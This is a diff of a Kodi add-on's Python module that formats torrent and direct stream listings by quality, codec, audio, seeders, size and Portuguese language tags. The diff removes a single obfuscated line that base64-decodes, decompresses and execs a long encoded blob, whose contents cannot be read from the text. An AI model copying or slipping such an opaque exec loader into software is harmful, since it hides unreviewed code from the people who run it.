@@ -1,1 +1,349 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+# -*- coding: utf-8 -*-
+"""
+Processamento e formatação de streams
+"""
+import re
+import xbmcaddon
+
+ADDON = xbmcaddon.Addon()
+
+
+_PROVIDERS_ALWAYS_PTBR = {'FrostStream'}
+_PROVIDERS_DEFAULT_720P = {''}
+
+def extrair_idiomas_do_titulo(titulo, extras=None, provider=None):
+    if provider in _PROVIDERS_ALWAYS_PTBR:
+        return 'PT-BR'
+
+    provedores_br = ['Fenixflix', 'StarckFilmes', 'SkyFlix', 'Brazuca', 'CDFlix',
+                     'ComandoTop', 'Mico-Leão', 'AnimeZey', 'Fonte Local']
+
+    if provider in provedores_br:
+        t = (titulo or '').lower()
+        if 'dual' in t or 'multi' in t:
+            return 'DUAL'
+        if 'legendado' in t or ' leg' in t:
+            return 'LEG'
+        return 'PT-BR'
+
+    if not titulo:
+        return 'LEG'
+
+    t = titulo.lower()
+
+    has_pt = any(x in t for x in ['dublado', 'portugues', 'português', 'pt-br', ' pt '])
+    has_dual = any(x in t for x in ['dual', 'dual audio', 'dublado e legendado', 'dub e leg'])
+    has_multi = 'multi' in t
+
+    if has_dual:
+        return 'DUAL'
+    if has_multi and has_pt:
+        return 'DUAL'
+    if has_pt:
+        return 'PT-BR'
+
+    return 'LEG'
+
+
+def get_color_seeders(val, stream_type):
+    """
+    Retorna label colorido e score para seeders
+    """
+    if stream_type == 'Direto' or val == 999:
+        return "Direct", 999
+    
+    try:
+        v = int(val)
+        color = "green" if v >= 10 else ("yellow" if v >= 5 else "red")
+        return f"[COLOR {color}]{v}[/COLOR]", v
+    except:
+        return "[COLOR grey]S:0[/COLOR]", 0
+
+
+def get_color_quality(q):
+    """
+    Retorna label colorido e score para qualidade
+    """
+    q = q.upper()
+    if '4K' in q or '2160P' in q:
+        return f"[COLOR gold]{q}[/COLOR]", 4
+    if '1080P' in q:
+        return f"[COLOR blue]{q}[/COLOR]", 3
+    if '720P' in q:
+        return f"[COLOR orange]{q}[/COLOR]", 2
+    return f"[COLOR grey]{q}[/COLOR]", 1
+
+
+def extrair_codec_hdr(raw_title):
+    """
+    Extrai codec, HDR e source do título
+    """
+    t = raw_title.lower()
+
+    # Source
+    source = ""
+    if any(x in t for x in ['web-dl', 'webdl', 'webrip']):
+        source = "web-dl"
+    elif any(x in t for x in ['bluray', 'blu-ray', 'bdrip', 'bdremux']):
+        source = "bluray"
+    elif 'hdrip' in t:
+        source = "hdrip"
+    elif 'dvdrip' in t:
+        source = "dvdrip"
+    elif '3d' in t:
+        source = "3d"
+    elif 'cam' in t:
+        source = "cam"
+    elif re.search(r'\bts\b', t):
+        source = "ts"
+
+    # Codec
+    codec = ""
+    if any(x in t for x in ('h265', 'x265', 'hevc')):
+        codec = "HEVC"
+    elif any(x in t for x in ('h264', 'x264', 'avc')):
+        codec = "AVC"
+
+    # HDR
+    hdr = ""
+    if 'hdr' in t:
+        hdr = "HDR"
+    elif '10bit' in t or '10-bit' in t:
+        hdr = "10bit"
+
+    return codec, hdr, source
+
+
+def extrair_audio(raw_title):
+    """
+    Extrai informações de áudio do título
+    """
+    t = raw_title.lower()
+
+    # Canais
+    canais = ""
+    if re.search(r'7[\.\s]?1', t):
+        canais = "7.1"
+    elif re.search(r'5[\.\s]?1', t):
+        canais = "5.1"
+    elif re.search(r'2[\.\s]?0', t):
+        canais = "2.0"
+
+    # Codec
+    codec = ""
+    if 'atmos' in t:
+        codec = "Atmos"
+    elif 'truehd' in t:
+        codec = "TrueHD"
+    elif 'dts-hd' in t or 'dtshd' in t:
+        codec = "DTS-HD"
+    elif 'dts' in t:
+        codec = "DTS"
+    elif 'eac3' in t or 'dd+' in t:
+        codec = "DD+"
+    elif 'ac3' in t:
+        codec = "AC3"
+    elif 'aac' in t:
+        codec = "AAC"
+
+    return " ".join(x for x in (codec, canais) if x)
+
+
+def _parse_lang_hint(hint):
+    if not hint:
+        return ''
+    h = hint.lower()
+    if 'legendado' in h:
+        return 'LEG'
+    if 'português e inglês' in h or 'dual' in h:
+        return 'DUAL'
+    if 'português' in h or 'portugues' in h:
+        return 'PT-BR'
+    return ''
+
+
+def process_single_stream(stream, is_local=False, p_name='Fonte Local', p_priority=999, item_data=None):
+    """
+    Processa um único stream e retorna dict formatado
+    """
+    url = stream.get('url') or stream.get('infoHash')
+    if not url:
+        return None
+
+    raw_title = stream.get('title') or stream.get('name') or ""
+    if raw_title and isinstance(raw_title, str):
+        try:
+            raw_title = raw_title.encode('latin-1').decode('utf-8')
+        except (UnicodeDecodeError, UnicodeEncodeError):
+            pass  # já está correto, ignora
+
+    # Providers cujo raw_title é o nome do addon, não metadados técnicos reais.
+    # Para eles, os regexes de qualidade/codec/audio são aplicados em string vazia,
+    # confiando apenas nos campos explícitos do objeto stream (ex: stream['quality']).
+    _UNRELIABLE_TITLE_PROVIDERS = {'NebulaStreams', 'HdHub'}
+
+    # Limpa título para display
+    display_title = raw_title
+
+    # Para providers com título = nome do addon (ex: "4KHDHub 1080p", "4KHDHub 4K"),
+    # separa o sufixo (qualidade real) do prefixo (nome do addon) e limpa o display_title
+    if p_name in _UNRELIABLE_TITLE_PROVIDERS:
+        suffix_match = re.match(
+            r'^[\w\d]*hub\s*(4K|2160p|1080p|720p|480p)?\s*(.*)',
+            display_title, flags=re.IGNORECASE
+        )
+        if suffix_match:
+            quality_from_name = suffix_match.group(1) or ''   # ex: "1080p" ou "4K"
+            leftover          = (suffix_match.group(2) or '').strip()  # qualquer coisa depois
+            display_title     = leftover  # vazio → cai no fallback com título real
+        else:
+            quality_from_name = ''
+    else:
+        quality_from_name = ''
+
+    display_title = re.sub(r'👤\s*\d+', '', display_title)
+    display_title = re.sub(r'S:\s*\d+', '', display_title)
+    display_title = re.sub(r'\[\s*\d+\.?\d*\s*(?:GB|MB)\s*\]', '', display_title, flags=re.IGNORECASE)
+    display_title = re.sub(r'⚙️\s*[^\n]+$', '', display_title)
+    display_title = ' '.join(display_title.split()).strip()
+    
+    if len(display_title) > 80:
+        display_title = display_title[:77] + '...'
+    
+    # Fallback se vazio
+    if not display_title and item_data:
+        nome_base = item_data.get('title') or 'Vídeo'
+        ano = item_data.get('year') or ''
+        if item_data.get('season') and item_data.get('episode'):
+            s = str(item_data['season']).zfill(2)
+            e = str(item_data['episode']).zfill(2)
+            display_title = f"{nome_base} S{s}E{e}"
+        else:
+            display_title = f"{nome_base} ({ano})" if ano else nome_base
+
+    # Detecta tipo
+    # Detecta tipo
+    if is_local:
+        is_torrent = (
+            "elementum" in url
+            or url.lower().startswith('magnet:')
+            or bool(re.match(r'^[a-fA-F0-9]{40}$', url))
+            or stream.get('server_name', '').upper() == 'TORRENT'
+        )
+        stype = 'Torrent' if is_torrent else 'Direto'
+    else:
+        force_direct_providers = ('Fenixflix', 'Nuvio')
+
+        if p_name in force_direct_providers:
+            stype = 'Direto'
+        else:
+            stype = stream.get('type', 'Direto')
+            if re.match(r'^[a-fA-F0-9]{40}$', url) or url.startswith('magnet:'):
+                stype = 'Torrent'
+
+    # Seeders
+    seed_match = re.search(r'(?:👤|S:)\s*(\d+)', raw_title)
+    s_val = seed_match.group(1) if seed_match else stream.get('seeders', 0)
+    if stype == 'Direto':
+        s_val = 999
+
+    # Substitui apenas o bloco do size_str em process_single_stream:
+
+    # 1. sizeBytes na raiz (KOD/Torrentio via KOD)
+    size_bytes = stream.get('sizeBytes') or stream.get('videoSize')
+
+    # 2. behaviorHints.videoSize (NebulaStreams / 4KHDHub)
+    if not size_bytes:
+        hints = stream.get('behaviorHints') or {}
+        size_bytes = hints.get('videoSize')
+
+    # 3. Converte bytes → string legível
+    if size_bytes:
+        try:
+            size_bytes = int(size_bytes)
+            if size_bytes >= 1_073_741_824:
+                size_str = f"{size_bytes / 1_073_741_824:.2f} GB"
+            else:
+                size_str = f"{size_bytes / 1_048_576:.0f} MB"
+        except (ValueError, TypeError):
+            size_str = 'N/A'
+    else:
+        # 4. Fallback: 💾 no title/description (Torrentio puro, alguns Knaben)
+        size_match = (
+            re.search(r'💾\s*(\d+(?:[.,]\d+)?\s*(?:GB|MB))', raw_title, re.IGNORECASE)
+            or re.search(r'(\d+(?:[.,]\d+)?\s*(?:GB|MB))', raw_title, re.IGNORECASE)
+        )
+        size_str = size_match.group(1).strip() if size_match else stream.get('size', 'N/A')
+
+    _title_for_meta = "" if p_name in _UNRELIABLE_TITLE_PROVIDERS else raw_title
+
+    # Quality — para providers com título não confiável, usa o sufixo extraído do nome
+    # (ex: "1080p" de "4KHDHub 1080p"), não o raw_title inteiro (que contém "4K" no prefixo)
+    if quality_from_name:
+        q_str = quality_from_name.upper()
+    elif p_name in _PROVIDERS_DEFAULT_720P:
+        q_str = '720P'
+    else:
+        q_match = re.search(r'(4K|2160p|1080p|720p|480p)', _title_for_meta, re.IGNORECASE)
+        if q_match:
+            q_str = q_match.group(1).upper()
+        else:
+            name_match = re.search(r'(4K|2160p|1080p|720p|480p)', stream.get('name', ''), re.IGNORECASE)
+            q_str = name_match.group(1).upper() if name_match else str(stream.get('quality', 'SD')).upper()
+
+    # Codec/HDR/Source
+    codec, hdr, source = extrair_codec_hdr(_title_for_meta)
+    audio = extrair_audio(_title_for_meta)
+    video_info = " ".join(x for x in (codec, hdr, audio) if x)
+
+    # Labels coloridos
+    seed_label, seed_score = get_color_seeders(s_val, stype)
+    qual_label, qual_score = get_color_quality(q_str)
+
+    _LANG_MAP = {
+        'DUB':        'PT-BR',
+        'DUBLADO':    'PT-BR',
+        'Dublado':    'PT-BR',
+        'PT-BR':      'PT-BR',
+        'PT':         'PT-BR',
+        'PORTUGUESE': 'PT-BR',
+        'Legendado':  'LEG',
+        'LEG':        'LEG',
+        'LEGENDADO':  'LEG',
+        'DUBBED':     'LEG',
+        'DUAL':       'DUAL',
+        'DUAL AUDIO': 'DUAL',
+        'MULTI':      'DUAL',
+    }
+    
+    raw_lang = (
+        _parse_lang_hint(stream.get('_lang_hint', ''))
+        or stream.get('languages')
+        or stream.get('audio_label')
+        or extrair_idiomas_do_titulo(stream.get('description', ''), stream.get('extras', []), p_name)
+        or extrair_idiomas_do_titulo(raw_title, stream.get('extras', []), p_name)
+    )
+    languages = _LANG_MAP.get((raw_lang or '').upper(), raw_lang) if raw_lang else 'LEG'
+    
+
+    return {
+        'url': url,
+        'display_title': display_title,
+        'raw_title': raw_title,
+        'quality_label': qual_label,
+        'seeders_label': seed_label,
+        'size': size_str,
+        'provider': p_name,
+        'languages': languages,
+        'codec': codec.lower() if codec else '',
+        'hdr': hdr.lower() if hdr else '',
+        'audio': audio.lower() if audio else '',
+        'source': source,
+        'video_info': video_info,
+        'p_priority': p_priority,
+        'q_score': qual_score,
+        's_score': int(s_val),
+        'manifest_type': stream.get('manifest_type', ''),
+        'headers': stream.get('headers', ''),
+        'type': stype,
+    }
